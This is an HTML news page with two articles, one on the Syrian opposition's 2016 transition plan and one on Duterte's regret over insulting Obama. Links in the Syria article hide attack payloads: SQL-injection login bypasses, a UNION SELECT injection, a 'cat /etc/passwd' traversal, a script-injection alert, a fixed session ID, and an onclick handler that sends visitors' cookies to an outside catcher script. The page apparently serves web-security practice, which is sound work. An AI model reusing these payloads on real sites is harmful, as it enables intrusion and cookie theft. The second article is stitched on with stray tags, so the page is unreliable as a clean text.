<h2>Syrian opposition coalition to announce democratic transition plan </h2>

<p class="details">By Patrick Wintour | Wednesday 7 September 2016 08.07 BST<a href="#"></a> </p>

<p>
A detailed transition plan for Syria, committing the country to  <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank"> democratic and religious pluralism </a>, will be unveiled on Wednesday by an alliance of moderate opposition groups.
</p> <p>
The move comes as the UK foreign secretary, Boris Johnson, urges Russia to end its support for the <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> Syrian president, Bashar al-Assad.</a>
</p> 

<p><img class="alignright" src="/images/syria.png" width="350" height="350" alt="Syria" /></p>

<p>
The High Negotiation Committee (HNC), an umbrella body representing more than <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> 30 political and military forces </a> seeking to wrest power from Assad, is to unveil its 25-page plan at a meeting in London.
</p> <p>
Johnson and his counterparts from the EU, Turkey, the US and Gulf states, will also be in attendance.
</p> <p>
Prior to becoming foreign secretary, Johnson had been sceptical about the value of supporting the Syrian opposition, saying there was a case for making common cause with Assad to <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> defeat Islamic State.</a>
</p> <p>
But Johnson has now embraced the HNC statement. In his first intervention on the Syria issue as foreign secretary, he has challenged Russia to help depose Assad.
</p> <p>
His comments mark a change of tone from March, when he praised the Kremlin for aiding Assad after Syrian troops saved the world heritage site of Palmyra from destruction by Isis.
</p> <p>
In an article for Wednesday’s edition of the Times, Johnson writes that Russia’s <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank" > “seemingly indefensible” </a> military efforts in Syria are keeping in power the “one man who bears overwhelming responsibility” for the civil war. 
</p> <p>
He points to the HNC’s transition plan as an answer to what will replace Assad – “a safe space, free from terror, to which migrants can return”.
</p> <p>
The new Syrian blueprint may also persuade Hillary Clinton it is worth investing political capital in seeking a solution in Syria, and not to dismiss the five-year civil war as a battle between <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  two equally unsavoury anti-democratic forces.</a>
</p> <p>
In the US presidential campaign, Clinton, the Democratic candidate, has said little about her plans for Syria, the biggest foreign policy headache facing the new administration, but she is seen as more interventionist than Barack Obama. Some Clinton foreign policy aides have been proposing a Syrian partition.
</p> <p>
The HNC blueprint sets out a six-month negotiating process leading to a single transitional governing body responsible for overseeing a unitary decentralised state, leading within 18 months to <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank"> parliamentary presidential and municipal elections.</a>
</p> <p>
The vision makes an unambiguous pledge to commit to democratic non-sectarian values. Assad and his immediate clique would be excluded from the transitional body.
</p> <p>
Salem al-Meslet, spokesman for the HNC, said: “We need a lasting solution to Syria’s nightmare, not local ceasefires or temporary cessations that can be exploited by the regime and its Russian ally.
</p> <p>
“The only way to a lasting solution is through political transition, through the United Nations. That is, transition from state terrorism to a country governed according to a social contract <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> for all the Syrian people.” </a>
</p> <p>
The vision promises to “build a political system that protects freedoms, safeguards individual rights, and that is founded upon the principles of liberty, equality, citizenship, and justice”.
</p> <p>
It promises all Syrian groups will be represented “without discrimination or exclusion based on religion, sect, ethnicity, or class” in one homeland “where women can enjoy their full public and individual rights and are ensured constitutionally protected active contribution in all state institutions and decision-making bodies and positions by at <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">  least a 30% quota”.</a>
</p> <p>
It also proposes that the caretaker transitional governing body form a joint military council under its authority, which would include representatives from the revolutionary forces and the regime army “who have not stained their hands with Syrian blood”.
</p> <p>
It stresses it is not seeking swaths of the Syrian state officials to quit in the kind of disastrous clear-out of thousands of regime officials that led to chaos and sectarian reprisals in Iraq in 2003.
</p> <p>
The plan addresses the need for a national dialogue and addresses the inevitable tension between the need for accountability for war crimes, and the need for political reconciliation.
</p> <p>
Diplomatic advocates of the vision say “it is a positive vision for Syria … it is extremely pragmatic, very heavy on continuity, inclusivity, excluding only a very few … it should reassure the Syrian middle that supports neither Assad or the extremists.<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> This is an attempt to tell the international community there is a way though this conflict.” </a>
</p> <p>
The document also sets out plans for the right of refugees to return and national reconciliation programmes to deter reprisals and ensure rights of all citizens.
</p> <p>
Writing in the Times, Johnson describes Assad as a recruiting sergeant for Islamic State and says the HNC document is the first credible portrait of Syria without Assad.
</p> <p>
He praises the HNC vision as “democratic and pluralistic, but which also makes the commonsensical assumption that you cannot just sweep away all the existing structures of the state. That was (one of) the mistakes in Iraq, and it will not be repeated.”
</p> <p>
But the plan is likely to be dismissed as a pipe dream in view of the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> battles and sieges raging </a> across Syria at present, as well as the apparent unwillingness of Russia to use its influence with Assad to end his destructive air bombardment and instead reopen talks about a political transition away from his regime.
</p> <p>
There are also questions about the extent to which the HNC still speaks for the military factions inside Syria fighting Assad and Isis, including the Kurdish YPG. But diplomats supportive of the HNC say all the moderate Syrian fighting forceshave been consulted and agree with document.
</p> <p>
It is also expected that at Wednesday’s meeting, the Turkish foreign minister will call for international support for a no-fly zone in northern Syria.
</p> <p>
Turkey’s offensive into northern Syria has driven Isis militants from the last 55-mile (90km) strip of border territory that they controlled.
</p> <p>
The country now wants international support for a deeper operation to take control of a rectangle of territory stretching about 25 miles into Syria – a buffer between two Kurdish-held cantons to the east and west and against Isis to the south. 

</p>







<p>

President Rodrigo Duterte of the Philippines has expressed regret for calling Barack Obama a “son of a whore” </a> – a remark that led to the US leader cancelling their meeting during a regional summit in Laos.
</p> <p>
In a statement read by his spokesman, Duterte said the remark was not intended as a personal insult. “While the immediate cause was my strong comments to certain press questions that elicited concern and distress, we also regret that it came across as a personal attack on the  US president </a>,” Ernesto Abella quoted Duterte as saying.
</p>




 <p>
He added that a meeting with the US had been “mutually agreed upon to be moved to a   later date </a>”.
</p> <p>
Duterte called Obama a “son of a whore” following weeks of criticism from the US against extrajudicial killings in the Philippines’ bloody drug war </a>.
</p> <p>
“Son of a whore, I will curse you in that forum,” Duterte was quoted as saying.
</p> <p>
As Duterte arrived in the Laos capital, Vientiane, for the Association of South-east Asian Nations summit on Monday evening, he was already rowing back on the remark, saying he did not want a fight.
</p> <p>
“I do not want to quarrel with him. He’s the  most powerful president </a> of any country on the planet,” Duterte said.
</p> <p>
Instead, he said, he was angry at members of the US state department who “keep on mouthing” statements about human rights.
</p> <p>
Elected in May on an anti-crime platform, Duterte has lashed out at the US and others for criticising his war on drugs, in which more than 2,400 people have been killed by police and vigilante militia.
</p> <p>
Obama said he was trying to schedule “some constructive, productive conversations </a>” with Duterte but a White House spokesman later confirmed the meeting was cancelled.
</p> <p>
The Philippines has been a key US ally for years and Washington hopes it will remain one, especially as a partner against  China’s military expansion </a> in the South China Sea.
</p> <p>
The Philippines, which has overlapping claims with China to islands and atolls in the sea, won an international ruling against Beijing in July. But Duterte has said it is  “better to continually engage China </a> in a diplomatic dialogue rather than anger officials there”, starkly at odds with his recent comments about Obama.
</p> <p>
“Our primary intention is to chart an independent foreign policy while promoting closer ties with all nations, especially the US with which we have had a longstanding partnership,” Duterte’s spokesman Abella said on Tuesday.
</p> <p>
With domestic popularity ratings in the order of 90%, the Philippine leader has won approval for his foul-mouthed press </a> conferences from a public tired with years of well-spoken politicians from a small Manila-based elite.
</p> <p>
Duterte previously named the US ambassador to Manila a “gay son of a whore” and told the Catholic church: “Don’t fuck with me.”
</p> <p>
He has called the United Nations “stupid” for criticism of his controversial war on crime, in which he said 100,000 people would be killed and told citizens  they should murder addicts.
</p>

